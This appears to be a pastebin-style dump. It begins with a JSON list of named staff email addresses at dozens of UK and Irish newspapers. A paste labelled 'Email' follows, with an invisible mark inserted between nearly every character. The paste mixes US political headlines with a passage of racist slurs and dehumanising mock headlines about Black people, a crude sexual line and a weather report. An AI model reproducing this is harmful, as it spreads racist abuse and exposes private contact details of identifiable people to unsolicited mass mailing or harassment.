    ""tina.callcutt@nationalworld.com"",
    ""jenny.bray@nationalworld.com"",
    ""mohamed.pardhan@nationalworld.com"",
    ""tafadzwa.busu@jpress.co.uk""
  ],
  ""Impartial Reporter"": [
    ""leighton.jones@newsquest.co.uk"",
    ""richie.beattie@newsquest.co.uk"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk"",
    ""Lynn.Craig@heraldandtimes.co.uk""
  ],
  ""Daily Mirror"": [
    ""joanne.mcgreevy@mgn.co.uk"",
    ""n.clarkson@mgn.co.uk"",
    ""alan.kelly@mgn.ie"",
    ""m.clowery@trinitymirror.com"",
    ""production@trinitymirror.com"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk"",
    ""michael.brown@reachplc.com"",
    ""adam.morrison@reachplc.com"",
    ""john.howard@reachplc.com""
  ],
  ""Belfast Telegraph"": [
    ""s.porter@mediahuis.co.uk"",
    ""i.hetherington@mediahuis.co.uk"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk"",
    ""dhartnett@mediahuis.ie"",
    ""belebert@independent.ie"",
    ""a.lambert@mediahuis.co.uk"",
    ""a.bridgnell@mediahuis.co.uk"",
    ""caireen.porter@mediahuis.co.uk"",
    ""a.kane@mediahuis.co.uk"",
    ""SETFinance@mediahuis.ie"",
    ""gfrazer@sundaylife.co.uk""
  ],
  ""Newry Reporter"": [
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk"",
    ""anne.reynolds@nationalworld.com"",
    ""joanne.monk@nationalworld.com "",
    ""tina.callcutt@nationalworld.com"",
    ""jenny.bray@nationalworld.com"",
    ""mohamed.pardhan@nationalworld.com"",
    ""tafadzwa.busu@jpress.co.uk""
  ],
  ""Sunday Life"": [
    ""s.porter@belfasttelegraph.co.uk"",
    ""i.hetherington@belfasttelegraph.co.uk"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk"",
    ""dhartnett@independent.ie"",
    ""belebert@independent.ie"",
    ""a.lambert@belfasttelegraph.co.uk"",
    ""a.bridgnell@mediahuis.co.uk"",
    ""caireen.porter@mediahuis.co.uk"",
    ""a.kane@mediahuis.co.uk"",
    ""SETFinance@mediahuis.ie"",
    ""gfrazer@sundaylife.co.uk""
  ],
  ""Sunday Mail"": [
    ""j.lynn@dailyrecord.co.uk"",
    ""charlie.smith@dailyrecord.co.uk"",
    ""i.steele@dailyrecord.co.uk"",
    ""t.heffernan@dailyrecord.co.uk"",
    ""a.reyburn@dailyrecord.co.uk"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk"",
    ""adam.morrison@reachplc.com""
  ],
  ""Sunday Mirror"": [
    ""joanne.mcgreevy@mgn.co.uk"",
    ""n.clarkson@mgn.co.uk"",
    ""alan.kelly@mgn.ie"",
    ""m.clowery@trinitymirror.com"",
    ""production@trinitymirror.com"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk"",
    ""adam.morrison@reachplc.com""
  ],
  ""Sunday People"": [
    ""joanne.mcgreevy@mgn.co.uk"",
    ""n.clarkson@mgn.co.uk"",
    ""alan.kelly@mgn.ie"",
    ""production@trinitymirror.com"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk""
  ],
  ""Sunday Post"": [
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""tthorburn@dcthomson.co.uk"",
    ""gforester@dcthomson.co.uk"",
    ""edlowe@dcthomson.co.uk"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk"",
    ""cbertie@dctmedia.co.uk"",
    ""lorrayne.brown@dcthomson.co.uk""
  ],
  ""Tyrone Herald"": [
    ""r.bell@northwestnewsgroup.com"",
    ""a.lynch@northwestnewsgroup.com"",
    ""austinlynch@northwestnewsgroup.com"",
    ""p.mcfarland@northwestnewsgroup.com"",
    ""d.mcclements@northwestnewsgroup.com"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""s.kelly@northwestnewsgroup.com"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk""
  ],
  ""Donegal News Monday"": [
    ""r.bell@northwestnewsgroup.com"",
    ""a.lynch@northwestnewsgroup.com"",
    ""austinlynch@northwestnewsgroup.com"",
    ""p.mcfarland@northwestnewsgroup.com"",
    ""d.mcclements@northwestnewsgroup.com"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""s.kelly@northwestnewsgroup.com"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk""
  ],
  ""Finn Valley Voice"": [
    ""r.bell@northwestnewsgroup.com"",
    ""a.lynch@northwestnewsgroup.com"",
    ""austinlynch@northwestnewsgroup.com"",
    ""p.mcfarland@northwestnewsgroup.com"",
    ""d.mcclements@northwestnewsgroup.com"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""s.kelly@northwestnewsgroup.com"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk""
  ],
  ""Fermanagh Herald"": [
    ""r.bell@northwestnewsgroup.com"",
    ""a.lynch@northwestnewsgroup.com"",
    ""austinlynch@northwestnewsgroup.com"",
    ""p.mcfarland@northwestnewsgroup.com"",
    ""d.mcclements@northwestnewsgroup.com"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""s.kelly@northwestnewsgroup.com"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk""
  ],
  ""Gaelic Life"": [
    ""r.bell@northwestnewsgroup.com"",
    ""a.lynch@northwestnewsgroup.com"",
    ""austinlynch@northwestnewsgroup.com"",
    ""p.mcfarland@northwestnewsgroup.com"",
    ""d.mcclements@northwestnewsgroup.com"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""s.kelly@northwestnewsgroup.com"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk""
  ],
  ""Strabane Chronicle"": [
    ""r.bell@northwestnewsgroup.com"",
    ""a.lynch@northwestnewsgroup.com"",
    ""austinlynch@northwestnewsgroup.com"",
    ""p.mcfarland@northwestnewsgroup.com"",
    ""d.mcclements@northwestnewsgroup.com"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""s.kelly@northwestnewsgroup.com"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk""
  ],
  ""Ulster Herald"": [
    ""r.bell@northwestnewsgroup.com"",
    ""a.lynch@northwestnewsgroup.com"",
    ""austinlynch@northwestnewsgroup.com"",
    ""p.mcfarland@northwestnewsgroup.com"",
    ""d.mcclements@northwestnewsgroup.com"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""s.kelly@northwestnewsgroup.com"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk""
  ],
  ""Dungannon Herald"": [
    ""r.bell@northwestnewsgroup.com"",
    ""a.lynch@northwestnewsgroup.com"",
    ""austinlynch@northwestnewsgroup.com"",
    ""p.mcfarland@northwestnewsgroup.com"",
    ""d.mcclements@northwestnewsgroup.com"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""s.kelly@northwestnewsgroup.com"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk""
  ],
  ""Donegal News Friday"": [
    ""r.bell@northwestnewsgroup.com"",
    ""a.lynch@northwestnewsgroup.com"",
    ""austinlynch@northwestnewsgroup.com"",
    ""p.mcfarland@northwestnewsgroup.com"",
    ""d.mcclements@northwestnewsgroup.com"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""s.kelly@northwestnewsgroup.com"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk""
  ],
  ""Alpha Titles"": [
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk""
  ],
  ""River Titles"": [
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk"",
    ""peter.columb@iconicnews.ie""
  ],
  ""Daily Express"": [
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""k.mccord@irishnews.com"",
    ""T.morrow@interpress.co.uk"",
    ""S.bunting@interpress.co.uk"",
        ""alan.kelly@reachplc.com"",
    ""michael.brown@reachplc.com"",
    ""alan.cocklin@reachplc.com"",
    ""andy.hopper@reachplc.com"",
    ""adam.morrison@reachplc.com"",
    ""john.howard@reachplc.com""
  ],
  ""Sunday Express"": [
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""k.mccord@irishnews.com"",
    ""T.morrow@interpress.co.uk"",
    ""S.bunting@interpress.co.uk"",
    ""alan.kelly@reachplc.com"",
    ""michael.brown@reachplc.com"",
    ""alan.cocklin@reachplc.com"",
    ""andy.hopper@reachplc.com"",
    ""john.howard@reachplc.com"",
    ""adam.morrison@reachplc.com""
  ],
  ""Daily Star"": [
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""k.mccord@irishnews.com"",
    ""T.morrow@interpress.co.uk"",
    ""S.bunting@interpress.co.uk"",
     ""michael.brown@reachplc.com"",
    ""alan.cocklin@reachplc.com"",
    ""andy.hopper@reachplc.com"",
    ""adam.morrison@reachplc.com"",
    ""john.howard@reachplc.com""
  ],
  ""Sunday Star"": [
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""k.mccord@irishnews.com"",
    ""T.morrow@interpress.co.uk"",
    ""S.bunting@interpress.co.uk"",
    ""alan.kelly@reachplc.com"",
    ""michael.brown@reachplc.com"",
    ""alan.cocklin@reachplc.com"",
    ""andy.hopper@reachplc.com"",
    ""john.howard@reachplc.com"",
    ""adam.morrison@reachplc.com""
  ],
  ""Mourne Observer"": [
    ""n.evans@spectatornewspapers.co.uk"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""k.mccord@irishnews.com""
  ],
  ""Newtownards Chronicle"": [
    ""n.evans@spectatornewspapers.co.uk"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""k.mccord@irishnews.com""
  ],
  ""County Down Spectator"": [
    ""n.evans@spectatornewspapers.co.uk"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""k.mccord@irishnews.com""
  ],
  ""Farm Week"": [
    ""mohamed.pardhan@nationalworld.com"",
    ""tafadzwa.busu@jpress.co.uk"",
    ""d.wilson@interpress.co.uk"",
    ""t.carey@interpress.co.uk"",
    ""t.morrow@interpress.co.uk"",
    ""s.bunting@interpress.co.uk"",
    ""anne.reynolds@nationalworld.com"",
    ""joanne.monk@nationalworld.com"",
    ""tina.callcutt@nationalworld.com"",
    ""jenny.bray@nationalworld.com"",
    ""mohamed.pardhan@nationalworld.com"",
    ""tafadzwa.busu@jpress.co.uk""
  ]
}
"
GcRu7L2X,News Aug24 23,Newscaster_Ned,Email,Thursday 24th of August 2023 08:34:14 AM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

𝅘𝅥𝅮T‎h‎e‎ ‎b‎e‎s‎t‎ ‎p‎a‎r‎t‎ ‎o‎f‎ ‎w‎a‎k‎i‎n‎g‎ ‎u‎p‎,‎ ‎i‎s‎ ‎F‎o‎l‎g‎e‎r‎'‎s‎ ‎a‎n‎d‎ ‎l‎i‎q‎u‎o‎r‎ ‎i‎n‎ ‎y‎o‎u‎r‎ ‎c‎u‎p‎.‎𝅘𝅥𝅮

*‎*‎*‎L‎i‎v‎e‎w‎i‎r‎e‎*‎*‎*‎

R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎ ‎R‎a‎u‎c‎o‎u‎s‎ ‎i‎n‎ ‎M‎i‎l‎w‎a‎u‎k‎e‎e‎

D‎e‎b‎a‎t‎e‎ ‎N‎i‎g‎h‎t‎ ‎F‎u‎n‎!‎

V‎i‎v‎e‎k‎,‎ ‎D‎e‎S‎a‎n‎t‎i‎s‎ ‎C‎e‎n‎t‎e‎r‎ ‎S‎t‎a‎g‎e‎

D‎i‎d‎ ‎*‎T‎r‎u‎m‎p‎*‎ ‎W‎i‎n‎?‎

B‎i‎d‎e‎n‎ ‎o‎n‎ ‎B‎a‎c‎k‎b‎u‎r‎n‎e‎r‎

H‎a‎l‎e‎y‎,‎ ‎P‎e‎n‎c‎e‎ ‎R‎i‎d‎e‎ ‎H‎a‎r‎d‎ ‎f‎o‎r‎ ‎U‎k‎r‎a‎i‎n‎e‎

F‎o‎x‎ ‎L‎o‎s‎e‎s‎ ‎C‎o‎n‎t‎r‎o‎l‎:‎ ‎P‎r‎i‎o‎r‎i‎t‎i‎z‎e‎s‎ ‎C‎l‎i‎m‎a‎t‎e‎ ‎C‎h‎a‎n‎g‎e‎,‎ ‎A‎b‎o‎r‎t‎i‎o‎n‎ ‎o‎v‎e‎r‎ ‎B‎o‎r‎d‎e‎r‎,‎ ‎C‎h‎i‎n‎a‎,‎ ‎W‎o‎k‎e‎…‎

…‎A‎s‎k‎s‎ ‎U‎F‎O‎ ‎Q‎u‎e‎s‎t‎i‎o‎n‎ ‎🤡
(‎F‎r‎o‎m‎ ‎L‎)‎ ‎F‎o‎r‎m‎e‎r‎ ‎G‎o‎v‎e‎r‎n‎o‎r‎ ‎o‎f‎ ‎A‎r‎k‎a‎n‎s‎a‎s‎ ‎A‎s‎a‎ ‎H‎u‎t‎c‎h‎i‎n‎s‎o‎n‎,‎ ‎f‎o‎r‎m‎e‎r‎ ‎G‎o‎v‎e‎r‎n‎o‎r‎ ‎o‎f‎ ‎N‎e‎w‎ ‎J‎e‎r‎s‎e‎y‎ ‎C‎h‎r‎i‎s‎ ‎C‎h‎r‎i‎s‎t‎i‎e‎,‎ ‎f‎o‎r‎m‎e‎r‎ ‎U‎S‎ ‎V‎i‎c‎e‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎M‎i‎k‎e‎ ‎P‎e‎n‎c‎e‎,‎ ‎F‎l‎o‎r‎i‎d‎a‎ ‎G‎o‎v‎e‎r‎n‎o‎r‎ ‎R‎o‎n‎ ‎D‎e‎S‎a‎n‎t‎i‎s‎,‎ ‎e‎n‎t‎r‎e‎p‎r‎e‎n‎e‎u‎r‎ ‎a‎n‎d‎ ‎a‎u‎t‎h‎o‎r‎ ‎V‎i‎v‎e‎k‎ ‎R‎a‎m‎a‎s‎w‎a‎m‎y‎,‎ ‎f‎o‎r‎m‎e‎r‎ ‎G‎o‎v‎e‎r‎n‎o‎r‎ ‎f‎r‎o‎m‎ ‎S‎o‎u‎t‎h‎ ‎C‎a‎r‎o‎l‎i‎n‎a‎ ‎a‎n‎d‎ ‎U‎N‎ ‎a‎m‎b‎a‎s‎s‎a‎d‎o‎r‎ ‎N‎i‎k‎k‎i‎ ‎H‎a‎l‎e‎y‎,‎ ‎U‎S‎ ‎S‎e‎n‎a‎t‎o‎r‎ ‎f‎r‎o‎m‎ ‎S‎o‎u‎t‎h‎ ‎C‎a‎r‎o‎l‎i‎n‎a‎ ‎T‎i‎m‎ ‎S‎c‎o‎t‎t‎ ‎a‎n‎d‎ ‎N‎o‎r‎t‎h‎ ‎D‎a‎k‎o‎t‎a‎ ‎…‎
T‎h‎e‎ ‎2‎0‎2‎4‎ ‎G‎O‎P‎ ‎p‎r‎e‎s‎i‎d‎e‎n‎t‎i‎a‎l‎ ‎p‎r‎i‎m‎a‎r‎y‎ ‎i‎s‎ ‎n‎o‎w‎ ‎o‎f‎f‎i‎c‎i‎a‎l‎l‎y‎ ‎u‎n‎d‎e‎r‎w‎a‎y‎ ‎a‎s‎ ‎s‎e‎v‎e‎r‎a‎l‎ ‎c‎a‎n‎d‎i‎d‎a‎t‎e‎s‎ ‎f‎a‎c‎e‎ ‎o‎f‎f‎ ‎o‎n‎ ‎t‎h‎e‎ ‎d‎e‎b‎a‎t‎e‎ ‎s‎t‎a‎g‎e‎ ‎i‎n‎ ‎M‎i‎l‎w‎a‎u‎k‎e‎e‎,‎ ‎W‎i‎s‎c‎o‎n‎s‎i‎n‎,‎ ‎b‎u‎t‎ ‎t‎h‎e‎ ‎b‎i‎g‎g‎e‎s‎t‎ ‎e‎l‎e‎p‎h‎a‎n‎t‎ ‎i‎s‎ ‎n‎o‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎r‎o‎o‎m‎.‎

M‎a‎u‎i‎ ‎W‎i‎l‎d‎f‎i‎r‎e‎s‎:‎ ‎O‎n‎l‎y‎ ‎P‎a‎v‎e‎d‎ ‎R‎o‎a‎d‎ ‎o‎u‎t‎ ‎o‎f‎ ‎T‎o‎w‎n‎ ‎W‎a‎s‎ ‎B‎a‎r‎r‎i‎c‎a‎d‎e‎d‎
M‎a‎u‎i‎ ‎W‎i‎l‎d‎f‎i‎r‎e‎s‎:‎ ‎O‎n‎l‎y‎ ‎P‎a‎v‎e‎d‎ ‎R‎o‎a‎d‎ ‎o‎u‎t‎ ‎o‎f‎ ‎T‎o‎w‎n‎ ‎W‎a‎s‎ ‎B‎a‎r‎r‎i‎c‎a‎d‎e‎d‎
1‎,‎1‎0‎6‎
D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎t‎o‎ ‎T‎u‎c‎k‎e‎r‎ ‎C‎a‎r‎l‎s‎o‎n‎:‎ ‎I‎n‎d‎i‎c‎t‎m‎e‎n‎t‎s‎ ‎A‎r‎e‎ ‎A‎l‎l‎ ‎'‎B‎u‎l‎l‎s‎h‎i‎t‎'‎
D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎t‎o‎ ‎T‎u‎c‎k‎e‎r‎ ‎C‎a‎r‎l‎s‎o‎n‎:‎ ‎I‎n‎d‎i‎c‎t‎m‎e‎n‎t‎s‎ ‎A‎r‎e‎ ‎A‎l‎l‎ ‎'‎B‎u‎l‎l‎s‎h‎i‎t‎'‎
6‎1‎6‎
N‎o‎l‎t‎e‎:‎ ‎J‎o‎e‎ ‎B‎i‎d‎e‎n‎’‎s‎ ‎9‎ ‎C‎r‎u‎e‎l‎ ‎M‎a‎u‎i‎ ‎B‎u‎n‎g‎l‎e‎s‎
N‎o‎l‎t‎e‎:‎ ‎J‎o‎e‎ ‎B‎i‎d‎e‎n‎’‎s‎ ‎9‎ ‎C‎r‎u‎e‎l‎ ‎M‎a‎u‎i‎ ‎B‎u‎n‎g‎l‎e‎s‎
4‎,‎4‎4‎2‎
T‎W‎I‎T‎T‎E‎R‎ ‎C‎l‎a‎i‎m‎s‎ ‎T‎r‎u‎m‎p‎ ‎I‎n‎t‎e‎r‎v‎i‎e‎w‎ ‎w‎i‎t‎h‎ ‎T‎u‎c‎k‎e‎r‎ ‎G‎e‎t‎s‎ ‎3‎3‎M‎ ‎V‎i‎e‎w‎s‎ ‎i‎n‎ ‎2‎0‎ ‎M‎i‎n‎u‎t‎e‎s‎ ‎
T‎W‎I‎T‎T‎E‎R‎ ‎C‎l‎a‎i‎m‎s‎ ‎T‎r‎u‎m‎p‎ ‎I‎n‎t‎e‎r‎v‎i‎e‎w‎ ‎w‎i‎t‎h‎ ‎T‎u‎c‎k‎e‎r‎ ‎G‎e‎t‎s‎ ‎3‎3‎M‎ ‎V‎i‎e‎w‎s‎ ‎i‎n‎ ‎2‎0‎ ‎M‎i‎n‎u‎t‎e‎s‎ ‎
9‎1‎3‎
F‎o‎x‎ ‎N‎e‎w‎s‎ ‎L‎o‎s‎e‎s‎ ‎C‎o‎n‎t‎r‎o‎l‎ ‎o‎f‎ ‎G‎O‎P‎ ‎D‎e‎b‎a‎t‎e‎,‎ ‎S‎c‎o‎l‎d‎s‎ ‎C‎r‎o‎w‎d‎ ‎a‎n‎d‎ ‎C‎a‎n‎d‎i‎d‎a‎t‎e‎s‎ ‎
F‎o‎x‎ ‎N‎e‎w‎s‎ ‎L‎o‎s‎e‎s‎ ‎C‎o‎n‎t‎r‎o‎l‎ ‎o‎f‎ ‎G‎O‎P‎ ‎D‎e‎b‎a‎t‎e‎,‎ ‎S‎c‎o‎l‎d‎s‎ ‎C‎r‎o‎w‎d‎ ‎a‎n‎d‎ ‎C‎a‎n‎d‎i‎d‎a‎t‎e‎s‎ ‎
2‎5‎2‎

A‎n‎n‎ ‎C‎o‎u‎l‎t‎e‎r‎:‎ ‎W‎e‎ ‎N‎e‎e‎d‎ ‎I‎m‎m‎i‎g‎r‎a‎t‎i‎o‎n‎,‎ ‎N‎o‎t‎ ‎T‎r‎u‎m‎p‎,‎ ‎a‎t‎ ‎t‎h‎e‎ ‎D‎e‎b‎a‎t‎e‎
1‎,‎1‎0‎4‎
F‎o‎x‎ ‎D‎e‎b‎a‎t‎e‎ ‎M‎o‎d‎e‎r‎a‎t‎o‎r‎s‎ ‎A‎s‎k‎ ‎C‎a‎n‎d‎i‎d‎a‎t‎e‎s‎ ‎A‎b‎o‎u‎t‎ ‎C‎l‎i‎m‎a‎t‎e‎ ‎C‎h‎a‎n‎g‎e‎
F‎o‎x‎ ‎D‎e‎b‎a‎t‎e‎ ‎M‎o‎d‎e‎r‎a‎t‎o‎r‎s‎ ‎A‎s‎k‎ ‎C‎a‎n‎d‎i‎d‎a‎t‎e‎s‎ ‎A‎b‎o‎u‎t‎ ‎C‎l‎i‎m‎a‎t‎e‎ ‎C‎h‎a‎n‎g‎e‎
4‎5‎1‎
B‎i‎d‎e‎n‎'‎s‎ ‎E‎m‎a‎i‎l‎ ‎A‎l‎i‎a‎s‎ ‎o‎n‎ ‎G‎o‎v‎t‎ ‎N‎e‎t‎w‎o‎r‎k‎ ‎R‎a‎i‎s‎e‎s‎ ‎S‎u‎s‎p‎i‎c‎i‎o‎n‎
B‎i‎d‎e‎n‎'‎s‎ ‎E‎m‎a‎i‎l‎ ‎A‎l‎i‎a‎s‎ ‎o‎n‎ ‎G‎o‎v‎t‎ ‎N‎e‎t‎w‎o‎r‎k‎ ‎R‎a‎i‎s‎e‎s‎ ‎S‎u‎s‎p‎i‎c‎i‎o‎n‎
6‎,‎8‎3‎1‎
F‎u‎l‎t‎o‎n‎ ‎C‎o‎u‎n‎t‎y‎ ‎R‎e‎l‎e‎a‎s‎e‎s‎ ‎G‎i‎u‎l‎i‎a‎n‎i‎,‎ ‎C‎o‎-‎D‎e‎f‎e‎n‎d‎a‎n‎t‎s‎'‎ ‎M‎u‎g‎s‎h‎o‎t‎s‎ ‎i‎n‎ ‎T‎r‎u‎m‎p‎ ‎C‎a‎s‎e‎ ‎
F‎u‎l‎t‎o‎n‎ ‎C‎o‎u‎n‎t‎y‎ ‎R‎e‎l‎e‎a‎s‎e‎s‎ ‎G‎i‎u‎l‎i‎a‎n‎i‎,‎ ‎C‎o‎-‎D‎e‎f‎e‎n‎d‎a‎n‎t‎s‎'‎ ‎M‎u‎g‎s‎h‎o‎t‎s‎ ‎i‎n‎ ‎T‎r‎u‎m‎p‎ ‎C‎a‎s‎e‎ ‎
7‎,‎0‎6‎1‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎—‎ ‎T‎h‎e‎ ‎2‎0‎2‎4‎ ‎G‎O‎P‎ ‎C‎a‎n‎d‎i‎d‎a‎t‎e‎ ‎I‎m‎m‎i‎g‎r‎a‎t‎i‎o‎n‎ ‎Q‎u‎e‎s‎t‎i‎o‎n‎n‎a‎i‎r‎e‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎—‎ ‎T‎h‎e‎ ‎2‎0‎2‎4‎ ‎G‎O‎P‎ ‎C‎a‎n‎d‎i‎d‎a‎t‎e‎ ‎I‎m‎m‎i‎g‎r‎a‎t‎i‎o‎n‎ ‎Q‎u‎e‎s‎t‎i‎o‎n‎n‎a‎i‎r‎e‎

N‎i‎g‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎H‎w‎h‎i‎t‎e‎ ‎M‎a‎n‎ ‎i‎s‎ ‎S‎h‎o‎t‎ ‎D‎e‎e‎e‎y‎a‎d‎ ‎i‎n‎ ‎F‎o‎r‎t‎ ‎L‎a‎u‎d‎e‎r‎d‎a‎l‎e‎.‎

I‎ ‎k‎n‎o‎w‎ ‎n‎i‎g‎g‎e‎r‎s‎ ‎a‎r‎e‎ ‎t‎h‎e‎ ‎c‎o‎l‎o‎r‎ ‎o‎f‎ ‎s‎h‎i‎t‎,‎ ‎a‎n‎d‎ ‎I‎ ‎g‎u‎e‎s‎s‎ ‎s‎h‎i‎t‎ ‎h‎a‎p‎p‎e‎n‎s‎.‎


5‎ ‎A‎f‎r‎i‎c‎o‎o‎n‎s‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎(‎I‎n‎c‎l‎u‎d‎i‎n‎g‎ ‎s‎o‎m‎e‎ ‎t‎e‎e‎n‎a‎p‎e‎r‎s‎ ‎a‎n‎d‎ ‎a‎ ‎n‎e‎g‎r‎e‎s‎s‎)‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎S‎h‎o‎o‎t‎i‎n‎g‎ ‎G‎a‎y‎ ‎G‎u‎y‎ ‎t‎o‎ ‎D‎e‎a‎t‎h‎ ‎B‎e‎f‎o‎r‎e‎ ‎S‎h‎o‎o‎t‎i‎n‎g‎ ‎a‎t‎ ‎Q‎w‎o‎p‎s‎.‎


S‎i‎l‎v‎e‎r‎b‎a‎c‎k‎ ‎S‎e‎t‎s‎ ‎F‎i‎r‎e‎ ‎t‎o‎ ‎E‎l‎d‎e‎r‎l‎y‎ ‎M‎a‎n‎'‎s‎ ‎A‎p‎a‎r‎t‎m‎e‎n‎t‎ ‎A‎f‎t‎e‎r‎ ‎B‎e‎a‎t‎i‎n‎g‎ ‎H‎i‎m‎ ‎t‎o‎ ‎D‎e‎a‎t‎h‎.‎


3‎ ‎C‎o‎l‎o‎r‎e‎d‎ ‎P‎e‎o‎p‎l‎e‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎T‎r‎y‎i‎n‎g‎ ‎t‎o‎ ‎F‎o‎r‎c‎e‎ ‎F‎o‎s‎t‎e‎r‎ ‎C‎h‎i‎l‎d‎ ‎i‎n‎t‎o‎ ‎P‎r‎o‎s‎t‎i‎t‎u‎t‎i‎o‎n‎.‎ ‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎G‎o‎d‎ ‎I‎'‎m‎ ‎s‎o‎ ‎f‎u‎c‎k‎i‎n‎g‎ ‎h‎o‎r‎n‎y‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎w‎e‎a‎t‎h‎e‎r‎.‎ ‎H‎e‎r‎e‎ ‎w‎e‎ ‎g‎o‎.‎

T‎o‎d‎a‎y‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
1‎0‎3‎°‎
/‎7‎7‎°‎
1‎%‎
S‎E‎ ‎5‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎4‎ ‎|‎ ‎D‎a‎y‎
1‎0‎3‎°‎
1‎%‎
S‎E‎
5‎
 ‎
m‎p‎h‎
A‎ ‎m‎i‎x‎ ‎o‎f‎ ‎c‎l‎o‎u‎d‎s‎ ‎a‎n‎d‎ ‎s‎u‎n‎.‎ ‎H‎o‎t‎.‎ ‎H‎i‎g‎h‎ ‎1‎0‎3‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎l‎i‎g‎h‎t‎ ‎a‎n‎d‎ ‎v‎a‎r‎i‎a‎b‎l‎e‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
4‎6‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
E‎x‎t‎r‎e‎m‎e‎
S‎u‎n‎r‎i‎s‎e‎
7‎:‎0‎2‎ ‎a‎m‎
